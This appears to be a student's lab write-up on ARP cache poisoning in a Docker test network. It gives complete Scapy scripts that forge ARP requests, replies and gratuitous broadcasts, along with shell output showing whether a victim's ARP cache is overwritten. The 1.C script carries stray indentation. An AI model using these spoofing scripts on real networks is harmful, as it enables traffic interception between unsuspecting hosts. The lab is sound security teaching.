### Docker Configuration
```shell
seed@VM:~$ dockps
e09f8cbbb9d3  M-10.9.0.105
b744fccdd43d  A-10.9.0.5
642ee46d1bf4  B-10.9.0.6
```

### Network Configuration
```shell
M - 10.9.0.105 - 02:42:0a:09:00:69
A - 10.9.0.5   - 02:42:0a:09:00:05
B - 10.9.0.6   - 02:42:0a:09:00:06
```

### Script to populate correct ARP tables:
```python3
#!/usr/bin/env python3
from scapy.all import *

M_mac, M_ip = ("02:42:0a:09:00:69", "10.9.0.105")
A_mac, A_ip = ("02:42:0a:09:00:05", "10.9.0.5")
B_mac, B_ip = ("02:42:0a:09:00:06", "10.9.0.6")

def parse(content):
    if content.lower() == "a":
        return A_mac, A_ip
    elif content.lower() == "b":
        return B_mac, B_ip
    else:
        return M_mac, M_ip

dst = "A"
src = "B"

dst_mac, dst_ip = parse(dst)
src_mac, src_ip = parse(src)

E = Ether(dst=dst_mac, src=src_mac)

A = ARP()
A.op = 1 #1 for ARP request; 2 for ARP reply
A.hwsrc = src_mac
A.psrc = src_ip
A.hwdst = dst_mac
A.pdst = dst_ip

arp_req = E/A
print(f"sending {src_ip}|{src_mac} to {dst_ip}|{dst_mac}")
sendp(arp_req)
```

## Task 1: ARP Cache Poisoning
### 1.A using ARP request
On the attack host (M), we need to construct an ARP request packet to map host B's IP address to M's MAC address. We then need to send that packet to host A. 

Now let's create our python scapy script:
```python3
#!/usr/bin/env python3
from scapy.all import *

M_mac, M_ip = ("02:42:0a:09:00:69", "10.9.0.105")
A_mac, A_ip = ("02:42:0a:09:00:05", "10.9.0.5")
B_mac, B_ip = ("02:42:0a:09:00:06", "10.9.0.6")

#sending ethernet packet from host M to host A
E = Ether(dst=A_mac, src=M_mac)

A = ARP()
A.op = 1 #1 for ARP request; 2 for ARP reply
#we want host A to associate host B's IP address with host M's MAC address
#so we need to send an ARP binding like (M_mac, B_ip)
A.hwsrc = M_mac
A.psrc = B_ip
#we're sending this ARP request to host A
A.hwdst = A_mac
A.pdst = A_ip

arp_req = E/A
sendp(arp_req)
```

```shell
root@e09f8cbbb9d3:/volumes# python3 1a.py 
.
Sent 1 packets.
```

Now let's hop over to host A and see if it worked:
```shell
root@b744fccdd43d:/# arp -n
Address                  HWtype  HWaddress           Flags Mask            Iface
10.9.0.6                 ether   02:42:0a:09:00:69   C                     eth0
```
Beautiful! Host A now cached that the IP address ```10.9.0.6``` (host B) is now bound to the MAC address ```02:42:0a:09:00:69``` (host M)

### 1.B using ARP reply
On host M, we need to construct an ARP reply packet to map host B's IP address to host M's MAC address. We then need to send this packet to host A.
#### Scenario 1: B's IP is already in A's cache
First we need to make sure host A's ARP table has the correct mapping for host B. We can do so by altering our previous script to send genuine source and destination IP and MAC addresses from host B to host A. The script I used to do that is linked at the top of the writeup. Let's check to see if host A has the correct mapping:

```shell
root@b744fccdd43d:/# arp -n    
Address                  HWtype  HWaddress           Flags Mask            Iface
10.9.0.1                 ether   02:42:41:69:9e:70   C                     eth0
10.9.0.6                 ether   02:42:0a:09:00:06   C                     eth0
```
Looks good to me!

The scapy script to send an ARP reply is much the same as the previous task except we change the ARP().op from 1 to 2, indicating an ARP reply. We execute the scapy script on Host M and jump to host A to see the results.
```shell
root@b744fccdd43d:/# arp -n
Address                  HWtype  HWaddress           Flags Mask            Iface
10.9.0.1                 ether   02:42:41:69:9e:70   C                     eth0
10.9.0.6                 ether   02:42:0a:09:00:69   C                     eth0
```
Looks like the ARP reply has overwritten the entry for host B's MAC address!

#### Scenario 2: B's IP is not in A's cache
Let's flush host A's arp cache:
```shell
root@b744fccdd43d:/# arp -d 10.9.0.6
```

Now that the cache is empty, let's run our script again from the attack host and check host A's cache again:
```shell
root@e09f8cbbb9d3:/volumes# python3 1b.py 
.
Sent 1 packets.
```
```shell
root@b744fccdd43d:/# arp -n
root@b744fccdd43d:/# 
```
We've got nothing. Looks like the attack wasn't successful.

### 1.C using ARP gratuitous message
On host M, construct an ARP gratuitous packet and use it to map B's IP address to M's MAC address and launch the attack under the same two scenarios as task 1.B. 

An ARP gratuitous packet is an ARP reply broadcast. The script is as follows:
```python3
#!/usr/bin/env python3
 from scapy.all import *
 
 M_mac, M_ip = ("02:42:0a:09:00:69", "10.9.0.105")
 A_mac, A_ip = ("02:42:0a:09:00:05", "10.9.0.5")
 B_mac, B_ip = ("02:42:0a:09:00:06", "10.9.0.6")
 broadcast_mac = "ff:ff:ff:ff:ff:ff"
 
 #sending ethernet packet from host M to all hosts on the subnet
 E = Ether(dst=broadcast_mac, src=M_mac)
 
 A = ARP()
 A.op = 2 #1 for ARP request; 2 for ARP reply
 #we want host A to associate host B's IP address with host M's MAC address, so we need to send an ARP binding like (M_mac, B_ip)
 A.hwsrc = M_mac
 A.psrc = B_ip
 #we're sending this ARP request to all hosts on the subnet
 A.hwdst = broadcast_mac
 A.pdst = A_ip
 
 arp_req = E/A
 sendp(arp_req)
```

#### Scenario 1: B's IP is already in A's cache
```shell
root@b744fccdd43d:/# arp -n
Address                  HWtype  HWaddress           Flags Mask            Iface
10.9.0.1                 ether   02:42:41:69:9e:70   C                     eth0
10.9.0.6                 ether   02:42:0a:09:00:06   C                     eth0

root@e09f8cbbb9d3:/volumes# python3 1c.py 
.
Sent 1 packets.

root@b744fccdd43d:/# arp -n
Address                  HWtype  HWaddress           Flags Mask            Iface
10.9.0.1                 ether   02:42:41:69:9e:70   C                     eth0
10.9.0.6                 ether   02:42:0a:09:00:69   C                     eth0
```
The results look very similar to the previous section, host B's MAC address was overwritten to be host M's.

#### Scenario 2: B's IP is not in A's cache
```shell
root@b744fccdd43d:/# arp -n
Address                  HWtype  HWaddress           Flags Mask            Iface
10.9.0.1                 ether   02:42:41:69:9e:70   C                     eth0

root@e09f8cbbb9d3:/volumes# python3 1c.py 
.
Sent 1 packets.

root@b744fccdd43d:/# arp -n 
Address                  HWtype  HWaddress           Flags Mask            Iface
10.9.0.1                 ether   02:42:41:69:9e:70   C                     eth0
```
No cigar, looks like if B's IP address isn't already in the cache, an ARP reply, regardless of broadcast or unicast, won't populate the cache.
